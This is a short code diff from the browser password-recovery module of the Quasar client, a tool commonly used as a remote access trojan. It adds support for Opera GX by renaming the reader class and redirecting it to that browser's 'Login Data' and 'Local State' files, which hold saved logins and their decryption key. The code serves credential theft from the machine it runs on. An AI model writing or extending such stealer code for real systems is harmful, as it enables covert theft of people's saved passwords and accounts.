@@ -5,10 +5,10 @@ using System.IO;
 
 namespace Quasar.Client.Recovery.Browsers
 {
-    public class OperaPassReader : ChromiumBase
+    public class OperaGXPassReader : ChromiumBase
     {
         /// <inheritdoc />
-        public override string ApplicationName => "Opera";
+        public override string ApplicationName => "Opera GX";
 
         /// <inheritdoc />
         public override IEnumerable<RecoveredAccount> ReadAccounts()
@@ -16,9 +16,9 @@ namespace Quasar.Client.Recovery.Browsers
             try
             {
                 string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "Opera Software\\Opera Stable\\Login Data");
+                    "Opera Software\\Opera GX Stable\\Login Data");
                 string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    "Opera Software\\Opera Stable\\Local State");
+                    "Opera Software\\Opera GX Stable\\Local State");
                 return ReadAccounts(filePath, localStatePath);
             }
             catch (Exception)
